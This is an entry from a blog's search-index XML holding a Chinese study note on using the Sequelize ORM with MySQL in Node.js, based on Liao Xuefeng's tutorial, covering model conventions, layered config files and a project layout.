      <link href="/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/3-javascript-web%E5%BC%80%E5%8F%91-mysql-%E4%BD%BF%E7%94%A8sequelize/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/JavaScript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/3-javascript-web%E5%BC%80%E5%8F%91-mysql-%E4%BD%BF%E7%94%A8sequelize/</url>
      
        <content type="html"><![CDATA[<p>ORM技术(Object-Relational Mapping)可以把关系数据库的表结构映射到对象上</p><h5 id="Sequelize-Node的ORM框架"><a href="#Sequelize-Node的ORM框架" class="headerlink" title="Sequelize (Node的ORM框架)"></a>Sequelize (Node的ORM框架)</h5><p>建立model <strong>统一</strong>规范</p><ul><li>Model存放的文件夹必须在<code>models</code>文件夹</li><li>每个Model必须遵守一套规范<ul><li>统一主键，名称必须是id，类型必须是STRING(50)；</li><li>主键可以自己指定，也可以由框架自动生成（如果为null或undefined）；</li><li>所有字段默认为NOT NULL，除非显式指定；</li><li>统一timestamp机制，每个Model必须有createdAt、updatedAt和version，分别记录创建时间、修改时间和版本号。其中，createdAt和updatedAt以BIGINT存储时间戳，最大的好处是无需处理时区，排序方便。version每次修改时自增。</li></ul></li></ul><span id="more"></span><h5 id="实现？"><a href="#实现？" class="headerlink" title="实现？"></a>实现？</h5><p>代码详见<a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001472286125147031e735933574ae099842afd31be80d1000">廖雪峰JavaScript教程</a></p><ul><li>使用db模块间接地定义Model(不直接使用Sequelize的API)<ul><li><code>db.js</code>的作用是统一Model的定义(代码详见教程)</li></ul></li><li>数据库配置(三个配置文件)<ul><li>三个配置文件<ul><li><code>config-default.js</code>   存储默认的配置</li><li><code>config-override.js</code>  存储特定的配置</li><li><code>config-test.js</code>      存储用于测试的配置</li></ul></li><li>配置：数据库，用户名，密码，端口等等</li><li>用<code>config.js</code>实现不同环境读取不同的配置文件，具体规则如下：<ul><li>先读取<code>config-default.js</code></li><li>如果不是测试环境，就读取<code>config-override.js</code>,文件不存在就忽略</li><li>如果是测试环境，就读取<code>config-test.js</code>。</li></ul></li><li>配置文件需要要搭建好的结构才能提高工程能力，兼顾：<ul><li>开发效率</li><li>避免服务器配置文件泄漏</li><li>方便执行测试</li></ul></li></ul></li><li>定义<code>model.js</code>自动扫描并导入所有Model</li></ul><h5 id="最后的工程结构："><a href="#最后的工程结构：" class="headerlink" title="最后的工程结构："></a>最后的工程结构：</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">model-sequelize/</span><br><span class="line">|</span><br><span class="line">+- .vscode/</span><br><span class="line">|  |</span><br><span class="line">|  +-  launch.json  &lt;<span class="comment">-- VSCode配置文件</span></span><br><span class="line">|</span><br><span class="line">+-  config.js     &lt;<span class="comment">-- 配置文件入口(导入配置文件)</span></span><br><span class="line">|</span><br><span class="line">+-  confit-<span class="keyword">default</span>.js  &lt;<span class="comment">--默认配置文件</span></span><br><span class="line">|</span><br><span class="line">+-  config-test.js     &lt;<span class="comment">-- 测试配置文件</span></span><br><span class="line">|</span><br><span class="line">+-  db.js          &lt;<span class="comment">-- 统一Model定义</span></span><br><span class="line">|</span><br><span class="line">+-  models/        &lt;<span class="comment">-- 存放所有Model</span></span><br><span class="line">|   |</span><br><span class="line">|   +-  *.js   Pet.js   <span class="keyword">User</span>.js  &lt;<span class="comment">-- df</span></span><br><span class="line">|</span><br><span class="line">+-  Model.js      &lt;<span class="comment">-- 导入Model文件</span></span><br><span class="line">|</span><br><span class="line">+-  init-db.js   &lt;<span class="comment">-- 初始化数据库 Sequelize的sync()方法?</span></span><br><span class="line">|</span><br><span class="line">+-  app.js        &lt;<span class="comment">-- 业务代码</span></span><br><span class="line">|</span><br><span class="line">+-  package.json  &lt;<span class="comment">-- 项目描述文件</span></span><br><span class="line">|</span><br><span class="line">+-  node_models/  &lt;<span class="comment">-- npm安装的依赖包</span></span><br></pre></td></tr></table></figure><ul><li>配置文件</li><li>Model文件</li><li>初始化数据库</li><li>业务代码</li><li>VSCode配置文件</li><li>项目描述文件与依赖包</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web开发 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 廖雪峰教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
